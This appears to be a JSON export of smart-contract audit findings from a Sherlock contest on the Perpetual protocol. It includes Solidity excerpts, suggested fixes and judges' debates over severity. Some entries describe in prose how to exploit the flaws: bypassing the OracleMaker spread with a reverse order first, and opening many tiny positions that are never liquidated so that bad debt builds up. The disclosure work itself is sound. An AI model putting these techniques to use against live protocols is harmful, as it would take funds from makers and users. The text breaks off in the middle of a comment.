risk than the normal risk parameters would allow them to, without having to worry about being liquidated. In both cases, the risk is that bad debt will be created before the position is liquidated. Both issues can be somewhat mitigated by the admin changing the risk parameters (either the margin requirements for #112, or the liquidation penalty for #115), and in both cases the admin can specifically manually target specific positions by sandwiching them with changes to the parameter and doing the liquidation in between the sandwich, in order to avoid the parameters affecting other users. Both issues can be used together by the same attacker to increase the risk of the position over what is possible with only one, but fixing one does not fix the other. Both would require off-chain monitoring to apply the sandwich workarounds, whenever the issue pops up, but I believe #115 would occur _more_ frequently, since it can happen by accident.\n> \n> I submitted #115 as Med since the admin could decide to override the normal parameters, as is described above, and #112 has the same workaround, so they should have the same severity. If one is a High, the other is too.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nevillehuang**\n\n@paco0x The following impact presented seems extremely concerning, however, given admin has workaround to mitigate the issue, I believe both this issue and #112 should remain as medium severity issues.\n\n> Alternatively, a determined attacker can create 1000 such transactions to reach a position size of $40k, with a cost of only $500 in transaction fees, plus whatever the current margin requirements are.\n\n**paco0x**\n\n> @paco0x The following impact presented seems extremely concerning, however, given admin has workaround to mitigate the issue, I believe both this issue and #112 should remain as medium severity issues.\n> \n> > Alternatively, a determined attacker can create 1000 such transactions to reach a position size of $40k, with a cost of only $500 in transaction fees, plus whatever the current margin requirements are.\n\nThanks for the reminder, we're aware of this issue and have already implemented a minimum requirement for opening positions in our latest code.\n\nI'm not sure the severity level for this issue under Sherlock's rules. Personally, I think it isn't an incentive for attackers for these behaviors. But anyway, we already fixed it and will let you guys decide the severity level of it.\n\n**detectiveking123**\n\nIssue is invalid. You also see the same thing with Aave; a bunch of small bad debt positions that no one cares to liquidate. It's highly unrealistic for this to ever happen because of how unprofitable it is for the attacker. \n\n**WangSecurity**\n\nI believe medium severity issue as appropriate here based on the comment [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115#issuecomment-2052727976) by the Lead Judge. Moreover, as I understand it can be used by regular users to create many small positions instead of one big and not fear liquidation. Taking in the fact that there is a workaround by admins to mitigate the issue, planning to reject the escalation and leave the issue as it is.\n\n**Evert0x**\n\nResult:\nMedium \nUnique\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [santipu03](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115/#issuecomment-2037981049): rejected\n- [IllIllI000](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115/#issuecomment-2041111535): rejected\n\n**IllIllI000**\n\nThe sponsor acknowledges that $10 is less than the [example](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115#issuecomment-2041111535) of $40, so the risk is still present. The minimum amount will also depend on the minimum percentage use for the fee split between the liquidator and the protocol. The sponsor also acknowledges that allowlisted makers may be able to exploit this issue. The sponsor plans to start out running their own liquidators, and may change the value in a future upgrade.",
      "summary": "\nThe Perpetual protocol has a bug where attackers can create positions that are too small to be worth liquidating, leading to insolvency. This can happen because there is no minimum position size and the liquidation fee is based on the total open notional. The bug was found by IllIllI and the protocol has acknowledged it. The code snippet shows how the penalty for liquidation is calculated, which can result in a zero fee for the liquidator. The impact of this bug is that it can lead to bad debt for the exchange, which they will have to cover in order to allow others to withdraw their funds. The tool used to find this bug was a manual review. The recommendation to fix this bug is to have a minimum position size and to round up the fee calculation. There was a discussion about the feasibility of this attack, with some saying it is unlikely to happen due to low gas fees on L2s, while others believe it could still be possible. The severity of this bug is debated, with some saying it is low due to the impracticality of the attack, while others believe it should be at least medium as it can still happen by accident and can be used in conjunction with other bugs to increase the risk of positions. The sponsor plans to fix this bug in a future upgrade.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "32166",
      "title": "M-3: There may be excess funds in the PnL pool or bad debt due to the funding fee.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/102 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nether\\_sky\n## Summary\nThere are two types of `makers`: `OracleMaker` and `SpotHedgeBaseMaker`, where `LPs` can deposit funds.\n`Traders` can then execute their `orders` against these `makers`.\nTo incentivize `LPs`, several mechanisms exist for these `makers` to profit.\nOne is the `borrowing fee`, which both `makers` can benefit from.\nAnother is the `funding fee`, which specifically benefits `OracleMaker`.\nThe `funding fee` incentivizes users to maintain `positions` with the same direction of `OracleMaker`.\nHowever, due to the `funding fee`, there may be excess funds in the `PnL pool` or occurrences of `bad debt`.\n## Vulnerability Detail\nTypically, in most `protocols`, the generated `yields` are totally distributed to users and the `protocol` itself.\nIn the `Perpetual` protocol, all `borrowing fees` from `payers` are solely distributed to `receivers`, which are whitelisted by the `protocol`.\nHowever, not all `funding fees` are distributed, or there may be a lack of `funding fees` available for distribution.\nThe current `funding rate` is determined based on the current `position` of the `base pool`(`OracleMaker`).\n```solidity\nfunction getCurrentFundingRate(uint256 marketId) public view returns (int256) {\n    uint256 fundingRateAbs = FixedPointMathLib.fullMulDiv(\n        fundingConfig.fundingFactor,\n        FixedPointMathLib\n            .powWad(openNotionalAbs.toInt256(), fundingConfig.fundingExponentFactor.toInt256())\n            .toUint256(),\n        maxCapacity\n    );\n}\n```\nHolders of `positions` with the same direction of the `position` of the `OracleMaker` receive `funding fees`, while those with `positions` in the opposite direction are required to pay `funding fees`.\nThe amount of `funding fees` generated per second is calculated as the product of the `funding rate` and the sum of `openNotionals` of `positions` with the opposite direction.\nConversely, the amount of `funding fees` distributed per second is calculated as the product of the `funding rate` and the sum of `openNotionls` of `positions` with the same direction of the `position` of the `OracleMaker`.\n```solidity\nfunction getPendingFee(uint256 marketId, address trader) public view returns (int256) {\n    int256 fundingRate = getCurrentFundingRate(marketId);\n    int256 fundingGrowthLongIndex = _getFundingFeeStorage().fundingGrowthLongIndexMap[marketId] +\n        (fundingRate * int256(block.timestamp - _getFundingFeeStorage().lastUpdatedTimestampMap[marketId]));\n    int256 openNotional = _getVault().getOpenNotional(marketId, trader);\n    int256 fundingFee = 0;\n    if (openNotional != 0) {\n        fundingFee = _calcFundingFee(\n            openNotional,\n            fundingGrowthLongIndex - _getFundingFeeStorage().lastFundingGrowthLongIndexMap[marketId][trader]\n        );   // @audit, here\n    }\n    return fundingFee;\n}\n```\nAll `orders` are settled against `makers`, meaning for every `long position`, there should be an equivalent `short position`.\nWhile we might expect the sum of `openNotionals` of `long positions` to be equal to the `openNotionals` of `short positions`, in reality, they may differ.\n\nSuppose there are two `long positions` with `openNotional` values of `S` and `S/2`.\nThen there should be two `short positions` with `openNotianal` values of `-S` and `-S/2`.\nIf the holder of the first `long position` cancels his `order` against the second `short position` with `-S/2`, the `openNotional` of the `long position` becomes `0`, and the second `short position` becomes a `long position`.\nHowever, we can not be certain that the `openNotional` of the new `long position` is exactly `S/2`.\n```solidity\nfunction add(Position storage self, int256 positionSizeDelta, int256 openNotionalDelta) internal returns (int256) {\n    int256 openNotional = self.openNotional;\n    int256 positionSize = self.positionSize;\n\n    bool isLong = positionSizeDelta > 0;\n    int256 realizedPnl = 0;\n\n    // new or increase position\n    if (positionSize == 0 || (positionSize > 0 && isLong) || (positionSize < 0 && !isLong)) {\n        // no old pos size = new position\n        // direction is same as old pos = increase position\n    } else {\n        // openNotionalDelta and oldOpenNotional have different signs = reduce, close or reverse position\n        // check if it's reduce or close by comparing absolute position size\n        // if reduce\n        // realizedPnl = oldOpenNotional * closedRatio + openNotionalDelta\n        // closedRatio = positionSizeDeltaAbs / positionSizeAbs\n        // if close and increase reverse position\n        // realizedPnl = oldOpenNotional + openNotionalDelta * closedPositionSize / positionSizeDelta\n        uint256 positionSizeDeltaAbs = positionSizeDelta.abs();\n        uint256 positionSizeAbs = positionSize.abs();\n\n        if (positionSizeAbs >= positionSizeDeltaAbs) {\n            // reduce or close position\n            int256 reducedOpenNotional = (openNotional * positionSizeDeltaAbs.toInt256()) /\n                positionSizeAbs.toInt256();\n            realizedPnl = reducedOpenNotional + openNotionalDelta;\n        } else {\n            // open reverse position\n            realizedPnl =\n                openNotional +\n                (openNotionalDelta * positionSizeAbs.toInt256()) /\n                positionSizeDeltaAbs.toInt256();\n        }\n    }\n\n    self.positionSize += positionSizeDelta;\n    self.openNotional += openNotionalDelta - realizedPnl;\n\n    return realizedPnl;\n}\n```\nIndeed, the `openNotional` of the new `long position` is determined by the current `price`.\nConsequently, while the `position size` of this new `long position` will be the same with the old second `long position` with an `openNotional` value of `S/2`, the `openNotional` of the new `long position` can indeed vary from `S/2`.\nAs a result, the sum of `openNotionals` of `short positions` can differ from the sum of `long positions`.\nThere are numerous other scenarios where the sums of `openNotionals` may vary.\n\nI believe that the developers also thought that the `funding fees` are totally used between it's `payers` and `receivers` from the below code.\n```solidity\n/// @notice positive -> pay funding fee -> fundingFee should round up\n/// negative -> receive funding fee -> -fundingFee should round down\nfunction _calcFundingFee(int256 openNotional, int256 deltaGrowthIndex) internal pure returns (int256) {\n    if (openNotional * deltaGrowthIndex > 0) {\n        return int256(FixedPointMathLib.fullMulDivUp(openNotional.abs(), deltaGrowthIndex.abs(), WAD));\n    } else {\n        return (openNotional * deltaGrowthIndex) / WAD.toInt256();\n    }\n}\n```\nThey even took `rounding` into serious consideration to prevent any shortfall of `funding fees` for distribution.\n## Impact\nExcess `funding fees` in the `PnL pool` can arise when the sum of `openNotionals` of the `payers` exceeds that of the `receivers`.\nConversely, `bad debt` may occur in other cases, leading to a situation where users are unable to receive their `funding fees` due to an insufficient `PnL pool`.\nIt is worth to note that other `yields`, such as the `borrowing fee`, are entirely utilized between it's `payers` and `receivers`.\nTherefore, there are no additional `funding sources` available to address any shortages of `funding fees`.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L133-L139\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L89-L102\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/vault/LibPosition.sol#L45-L48\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L183-L191\n## Tool used\n\nManual Review\n\n## Recommendation\nWe can calculate `funding fees` based on the `position size` because the sum of the `position sizes` of `long positions` will always be equal to the sum of `short positions` in all cases.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n**takarez** commented:\n>  valid; medium(8)\n\n\n\n**vinta**\n\nConfirmed, this is valid. Thanks for finding this bug!\n\nWe're still figuring out a fix, or we might probably just disable fundingFee entirely if we cannot solve it before launch.\n\n**etherSky111**\n\nEscalate\n\nI think this is a `high` risk issue.\nThis has a `high likelihood` of occurrence, as it can happen easily.\nThe impact is also `high` due to the absence of `available funding sources` in case of `bad debt`. \nConsequently, users' `margins` and `borrowing fees` will be reduced.\n\nAnd the sponsor has confirmed their intention to disable this feature if a suitable solution is not found.\nThis shows the severity of the impact.\n\nAnyway, this is my first contest in Sherlock and am not familiar with the rules.\nI hope for a kind review.\nThanks in advance.\n\n\n**sherlock-admin2**\n\n> Escalate\n> \n> I think this is a `high` risk issue.\n> This has a `high likelihood` of occurrence, as it can happen easily.\n> The impact is also `high` due to the absence of `available funding sources` in case of `bad debt`. \n> Consequently, users' `margins` and `borrowing fees` will be reduced.\n> \n> And the sponsor has confirmed their intention to disable this feature if a suitable solution is not found.\n> This shows the severity of the impact.\n> \n> Anyway, this is my first contest in Sherlock and am not familiar with the rules.\n> I hope for a kind review.\n> Thanks in advance.\n> \n\nThe escalation could not be created because you are not exceeding the escalation threshold.\n\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page,\nin the [Sherlock webapp](https://app.sherlock.xyz/audits/).\n\n\n**etherSky111**\n\nHi @nevillehuang , thanks for your judging.\n\nI need assistance with escalation, as I couldn't create it.\nWhat do I need to do for this?\n\nThanks.\n\n**GTH1235**\n\nEscalate\n\nI think this is a high risk issue.\nThis has a high likelihood of occurrence, as it can happen easily.\nThe impact is also high due to the absence of available funding sources in case of bad debt.\nConsequently, users' margins and borrowing fees will be reduced.\n\nAnd the sponsor has confirmed their intention to disable this feature if a suitable solution is not found.\nThis shows the severity of the impact.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> I think this is a high risk issue.\n> This has a high likelihood of occurrence, as it can happen easily.\n> The impact is also high due to the absence of available funding sources in case of bad debt.\n> Consequently, users' margins and borrowing fees will be reduced.\n> \n> And the sponsor has confirmed their intention to disable this feature if a suitable solution is not found.\n> This shows the severity of the impact.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\n`There may be` meaning it won't necessarily happen (i.e. Medium). The funding fee does not cause bad debt, it just temporarily causes there to be fewer funds in the pool than expected. As soon as the funding flips to the other side, it's likely to be remedied without any intervention at all (as is indicated by the fact that the title begins with `There may be excess funds`). The readme says `PnL Pool currently starts empty, so a trader with realized gains may experience temporary illiquidity when he tries to withdraw those gains. This inconvenience will be mitigated in the future with a buffer balance` so the pool is expected to have temporary liquidity problems for traders, which are expected to be mitigated. There is no bad debt being created here.\n\n**etherSky111**\n\nLet's change `There may be` to `There should be`.\nIn cases where the opposite open notional is larger, there should be `bad debt`. \nThe `PnL pool` involves the user's `margin` and `borrowing fees`. \nWhen users withdraw their `funding fees`, it is deducted from the `PnL pool`, which involves the user's `margin` and `borrowing fees`.\nAnd `As soon as the funding flips to the other side,`: this is just assumption.\nIf we evaluate things in this manner, the likelihood of most issues will be very low.\n\n**nevillehuang**\n\n@etherSky111 @IllIllI000 How often can this situation of excess funds occur?\n\n**etherSky111**\n\nThis situation can easily happen (The `likelihood` is really high).\n\nThere are `2` possible states.\n`1`. The opposite `open notional` is larger.\n`2`. vice versa\n\nIn case 1, there will be `bad debts` due to there are more `receivers` than `payers`.\nUsers' `PnL`, `borrowing fees` and `funding fees` are settled through `PnL pool`.\nIf there are `X bad debts` in `funding fees`, these will be deducted from `PnL pool` which includes users' `PnL` and `borrowing fees`.\n\nIt's important to note that there's no guarantee that the market will swiftly transition from the first case to the second.\nIt will disrupt the equilibrium of the `market`.\n\nThanks. \n\n**IllIllI000**\n\nThere is no bad debt created. Bad debt is when a specific user has losses that are greater than the margin collateral backing the position, which means it will _never_ be paid back and the system as a whole will have a loss forever. In this case, it's a temporary liquidity deficit that will be resolved when the opposite side becomes the larger open notional. As I've pointed out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/102#issuecomment-2041451118), according to the readme, it's _expected_ that there are temporary liquidity deficits, so _that is not a security risk_. The only thing broken here is that the sponsor though that only trader PnL could cause the temporary deficit, but with this issue, the funding fee can cause it too.\n\n**etherSky111**\n\nAre you sure 100%?\n```\nwhen the opposite side becomes the larger open notional.\n```\nAs I said earlier, this is just an assumption.\n\n**IllIllI000**\n\nThere has never been a perpetuals market, where the funding fee stayed only on one side. The whole point of the fee is to incentivize people to open positions on the other side of the market in order to make the futures price equal the spot price, at which point the fee rate will become zero again, and then there will be a random walk of orders coming in, which will randomly choose the next side with the larger open notional.\n\n**etherSky111**\n\nEnsuring that the sum of `funding fees` aligns with `0` is not guaranteed.\nAnd this is not a `temporary liquidity deficits`.\nThis deficit is based on the fact that the sum of `borrowing fees` and users' `PnL` equal `0`.\n\nAs a newcomer to `Sherlock`, I'm unfamiliar with the rules, so I'll leave it to the judge to decide, and I'll respect his decision.\n\nThank you.\n\n**nevillehuang**\n\nBased on discussions, I believe medium severity is appropriate for this issue.\n\n**WangSecurity**\n\nAgree with the Lead Judge, Medium is indeed appropriate here due to requirement of specific state. Hence, planning to reject the escalation and leave the issue as it is.\n\n**Evert0x**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [GTH1235](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/102/#issuecomment-2039586410): rejected",
      "summary": "\nThe report highlights an issue with the Perpetual protocol where there may be excess funds in the PnL pool or occurrences of bad debt due to the funding fee. This is caused by the way funding fees are distributed and the potential for differences in the sum of openNotionals for long and short positions. The severity of this issue is deemed to be medium and has been resolved by the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/102",
      "tags": [],
      "finders": [
        "ether\\_sky"
      ]
    },
    {
      "id": "32165",
      "title": "M-2: In certain cases, users are unable to settle their orders with the PartialFill trade type.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/95 \n\n## Found by \nether\\_sky\n## Summary\nThere are 2 `trade` types available:  `FoK` or `PartialFill`.\nUsers have the option to partially settle their `orders`.\nHowever, in some cases, they can't settle their `orders.\n## Vulnerability Detail\nA user creates an `order` with the `PartialFill` `trade` type and a size of `S`.\nInitially, he settles `50%` of this `order`.\nAt this point, the `totalFilledAmount` of this `order` has a value of `S/2`.\n```solidity\nfunction _fillTakerOrder(\n    InternalContext memory context,\n    SettleOrderParam memory settleOrderParams\n) internal returns (InternalWithdrawMarginParam memory, uint256) {\n    _getOrderGatewayV2Storage().totalFilledAmount[takerOrder.getKey()] += settleOrderParams.fillAmount;\n}\n```\nAfter some time, the user attempts to settle the remaining `50%` of that `order`.\nIn the `_verifyOrder` function, we check whether there is enough `positionSize` available to settle this `order` if the `action` of the `order` is `ReduceOnly`.\nHowever, the issue arises from not accounting for the previously settled amount.\n```solidity\nfunction _verifyOrder(IVault vault, Order memory order, uint256 fillAmount) internal view {\n      uint256 totalFilledAmount = getOrderFilledAmount(order.owner, order.id);\n      if (fillAmount > openAmount - totalFilledAmount) {\n          revert LibError.ExceedOrderAmount(order.owner, order.id, totalFilledAmount);\n      }\n      if (order.action == ActionType.ReduceOnly) {\n          int256 ownerPositionSize = vault.getPositionSize(order.marketId, order.owner);\n\n          if (order.amount * ownerPositionSize > 0) {\n              revert LibError.ReduceOnlySideMismatch(order.owner, order.id, order.amount, ownerPositionSize);\n          }\n\n          if (openAmount > ownerPositionSize.abs()) {  // @audit, here\n              revert LibError.UnableToReduceOnly(order.owner, order.id, openAmount, ownerPositionSize.abs());  \n          }\n      }\n}\n```\nIn the initial settlement, half of the `order` was settled.\nAfter the settlement, the `positionSize` decreases by `S/2` also and there are only `S/2` remaining in the `order`.\nTherefore, we should compare `S/2` with the current `positionSize`.\nHowever,  we compare `S` again without accounting for the previously settled amount.\nAs a result, the current `positionSize` might be lower than `S`, leading to the potential reversal of the settlement.\n## Impact\nThis is a DoS and users can lose funds as gas fees.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L336\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L513-L515\n## Tool used\n\nManual Review\n\n## Recommendation\n```solidity\nfunction _verifyOrder(IVault vault, Order memory order, uint256 fillAmount) internal view {\n      uint256 totalFilledAmount = getOrderFilledAmount(order.owner, order.id);\n      if (fillAmount > openAmount - totalFilledAmount) {\n          revert LibError.ExceedOrderAmount(order.owner, order.id, totalFilledAmount);\n      }\n      if (order.action == ActionType.ReduceOnly) {\n          int256 ownerPositionSize = vault.getPositionSize(order.marketId, order.owner);\n\n          if (order.amount * ownerPositionSize > 0) {\n              revert LibError.ReduceOnlySideMismatch(order.owner, order.id, order.amount, ownerPositionSize);\n          }\n\n-          if (openAmount > ownerPositionSize.abs()) { \n+          if (openAmount - totalFilledAmount > ownerPositionSize.abs()) { \n              revert LibError.UnableToReduceOnly(order.owner, order.id, openAmount, ownerPositionSize.abs());  \n          }\n      }\n}\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/perpetual-protocol/perp-contract-v3/pull/6\n\n\n**sherlock-admin3**\n\nThe Lead Senior Watson signed off on the fix.",
      "summary": "\nIssue M-2: Users unable to settle orders with the PartialFill trade type in certain cases.\n\nSummary:\nWhen users try to partially settle their orders using the PartialFill trade type, they may encounter an issue where they are unable to settle their orders. This is because the system does not account for previously settled amounts, leading to potential reversal of the settlement and loss of funds.\n\nVulnerability Detail:\nWhen a user creates an order with the PartialFill trade type and settles only a portion of it, the system does not account for the settled amount when the user tries to settle the remaining portion. This can result in the system comparing the remaining order size with the wrong position size, potentially causing the settlement to be reversed.\n\nImpact:\nThis issue can cause a denial of service and result in users losing funds due to gas fees.\n\nRecommendation:\nThe code should be updated to account for previously settled amounts when checking if there is enough position size available to settle an order.\n\nDiscussion:\nThe protocol team has fixed this issue in a recent update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/95",
      "tags": [],
      "finders": [
        "ether\\_sky"
      ]
    },
    {
      "id": "32164",
      "title": "M-1: OracleMaker's price with spread does not take into account the new position",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI, PUSH0\n## Summary\n\nOracleMaker's `_getBasePriceWithSpread()` does not take into account the opening position's size, but only on the current position of the Maker.\n\nThis means there is no price impact protection against large trades (or any trades at all) for the Oracle Maker. Anyone can then bypass the spread by opening a reverse position before actually opening their intended position.\n\n## Vulnerability Detail\n\nTo reduce risky positions, the Oracle Maker will quote a slightly worse price (for the trader) than the actual Oracle price for any positions that increases risk. This is also mentioned in the [audit docs](https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4), Dynamic Premium section.\n\nWhen a new position is requested, the Oracle Maker quotes a price that includes this spread:\n\n```solidity\nfunction fillOrder(\n    bool isBaseToQuote,\n    bool isExactInput,\n    uint256 amount,\n    bytes calldata\n) external onlyClearingHouse returns (uint256, bytes memory) {\n    uint256 basePrice = _getPrice();\n    uint256 basePriceWithSpread = _getBasePriceWithSpread(basePrice, isBaseToQuote); // @audit here\n```\n\nThere is no spread when the new position reduces risk (e.g. if the current Maker position is +3 ETH, and the new order implies -1 ETH, then the Maker will quote the oracle price directly).\n\nHowever, `_getBasePriceWithSpread()` never uses the order's amount, therefore large positions will be quoted the same price as small positions, i.e. there is no price impact. This issue also exists if the new position passes the zero mark, where the Maker thinks it's de-risking, while in reality it's being subject to much more risk in the opposite direction.\n- Suppose the Oracle Maker's current total position is 1 ETH long (+1 ETH)\n- Someone opens a 100 ETH long position, the Oracle Maker thinks it's de-risking by being able to open a 100 ETH short, and quotes the oracle price.\n- After the trade, the Maker is actually in a much riskier position of 99 ETH short (-99 ETH)\n\nAnyone can then bypass the spread completely (or partially) by opening a position in the opposite direction before the intended direction:\n- The Oracle Maker's current total position is 1 ETH long (+1 ETH).\n- Alice wants to open a 10 ETH long (+10 ETH) position.\n\nIf Alice sends a 10 ETH long order now, she would have to accept the base price spread and get a slightly worse price than the Pyth oracle price. However Alice can bypass the spread by sending the following two orders in quick succession to the relayer:\n- First order: 1 ETH short (-1 ETH)\n  - The Maker thinks it's de-risking, so it quotes the oracle price directly.\n  - After this order, the Maker has 0 ETH position.\n- Second order: 11 ETH long (+11 ETH)\n  - Since the Maker's position is zero, it quotes the oracle price.\n  - Alice has opened a net total of +10 ETH as intended. However she is not subject to the price spread.\n \nAlice was able to bypass the premium from the spread model, and force the Maker to quote exactly the Pyth oracle price. Note that Alice doesn't have to fully bypass the spread, she could have just opened a -0.5 ETH first and would still largely bypass the spread already. \n\n## Impact\n\n- Dynamic Premiums from the price spread can be bypassed completely, traders can always be quoted the oracle price without spread (or with a heavy reduction of the spread).\n- Maker is exposed to more risk than the intended design.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L272\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L401-L409\n\n## Tool used\n\nManual review\n\n## Recommendation\n\n`_getBasePriceWithSpread()` must take into account the average spread of the Maker's position before and after the trade, not just the position before the trade.\n- See proof [here](https://sips.synthetix.io/sips/sip-279/#technical-specification). Note this formula still works when the new position movement crosses the zero mark, as the integral of a constant zero function is zero.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n\n\n**rc56**\n\n@lnxrp: \n- Won't fix\n- It is true that the trick (reverse position before actually opening their intended position) could bypass OracleMaker's  spread, but the impact is considered a degradation (high risk exposure without proper compensation) of maker performance instead of a critical vulnerability\n- Note the maker has `minMarginRatio` which protects it from taking too much exposure. The parameter had been set conservative (`minMarginRatio = 100%`) from the start so we have extra safety margin to observe its real-world performance and improve it iteratively\n\n**midori-fuse**\n\nEscalate\n\nWe have shown the method to bypass the Oracle Maker's spread, which is meant to be the protection against large exposures. This attack also has no external conditions: With any amount of margin, you can still partially bypass the spread. Larger margin only maximizes the impact, but smaller margin does not prevent it in any way.\n\nThe effect of bypassing the premium is that the Oracle Maker is forced to take positions without spread (or with a heavy reduction). Elaborating on this, this means that the Oracle Maker is forced to take the same position size for a larger (absolute) open notional. This translates to a direct loss should the price moves in any direction:\n- If the price goes in the favor of the Oracle Maker's position, the larger open notional decreases the Maker's profit.\n- If the price goes against the favor of the Oracle Maker's position, the larger open notional increases the Maker's loss.\n\nNote that we are only elaborating what is already written in our report (elaborating the direct effect of the Maker quoting a less favorable price). The elaborated info only arises from the definition of a standard perpetual contract, and we are adding no additional info.\n\nTherefore the impact translates to direct loss under any resulting price movements. Because it also has no external conditions for this trick to be possible, I believe this fits into the criteria of a High risk issue.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> We have shown the method to bypass the Oracle Maker's spread, which is meant to be the protection against large exposures. This attack also has no external conditions: With any amount of margin, you can still partially bypass the spread. Larger margin only maximizes the impact, but smaller margin does not prevent it in any way.\n> \n> The effect of bypassing the premium is that the Oracle Maker is forced to take positions without spread (or with a heavy reduction). Elaborating on this, this means that the Oracle Maker is forced to take the same position size for a larger (absolute) open notional. This translates to a direct loss should the price moves in any direction:\n> - If the price goes in the favor of the Oracle Maker's position, the larger open notional decreases the Maker's profit.\n> - If the price goes against the favor of the Oracle Maker's position, the larger open notional increases the Maker's loss.\n> \n> Note that we are only elaborating what is already written in our report (elaborating the direct effect of the Maker quoting a less favorable price). The elaborated info only arises from the definition of a standard perpetual contract, and we are adding no additional info.\n> \n> Therefore the impact translates to direct loss under any resulting price movements. Because it also has no external conditions for this trick to be possible, I believe this fits into the criteria of a High risk issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nirohgo**\n\nEscalate\n\nThis is low/informational\n\n\nThe attack described can not be performed as described. This is because traders can only open positions with the Oracle Maker through the relayer. This means there is no way to know which other orders will be settled before or between the two attack steps (or even their order of execution). The Oracle Maker position direction can change direction in the meantime, making the attacker get a worse price instead of better. Even if the Oracle Maker enabled direct interaction there would still be the risk of other transactions getting in before the attacker and changing the OM position direction.\n\nWithout the attack, this is a design improvement and not a medium severity finding.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> This is low/informational\n> \n> \n> The attack described can not be performed as described. This is because traders can only open positions with the Oracle Maker through the relayer. This means there is no way to know which other orders will be settled before or between the two attack steps (or even their order of execution). The Oracle Maker position direction can change direction in the meantime, making the attacker get a worse price instead of better. Even if the Oracle Maker enabled direct interaction there would still be the risk of other transactions getting in before the attacker and changing the OM position direction.\n> \n> Without the attack, this is a design improvement and not a medium severity finding.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\n@nevillehuang what's your response to these escalations? \n\nFrom my understanding, is it possible to execute these two orders in the same block/tx? Or does it depend on external transaction (oracle price update) between the two orders?  \n\n**midori-fuse**\n\nAccording to the contest README:\n\n> The relayer may have some value extraction strategies available (for example by delaying the execution of the orders), and is trusted not to use them.\n\nWhile it is not possible to execute two orders in the same tx, opening two orders in quick succession should still not be difficult (you just literally make actions quickly no?). If the relayer is trusted to resolve orders without utilizing any value-extraction strategies, then it is trusted to resolve orders in a timely manner, in the order it received.\n\nRelayer should update the oracle price before each order anyway (it is stated that the protocol will use `Multicaller`, so it should be assumed that the Oracle Maker's price at the time of order is always fresh). However if you open orders quickly (in, say, a few seconds, or even less than a second if you can make two mouse clicks quickly), then the oracle price change should not be substantially large, and the chances of any order getting in between is extremely low (not mentioning changing maker position directions as a whole).\n\n**nirohgo**\n\nThe arrival of orders sent to an offchain relayer depends on networking, so its not even guaranteed that your orders will get to the relayer at the order you sent them, let alone other orders getting before/in between your orders. If trade volume is high it's even likely. The point is the attacker will be taking a risk that I don't think is justified by the potential gain. \n\n**midori-fuse**\n\nNetwork related factors are dependent on the 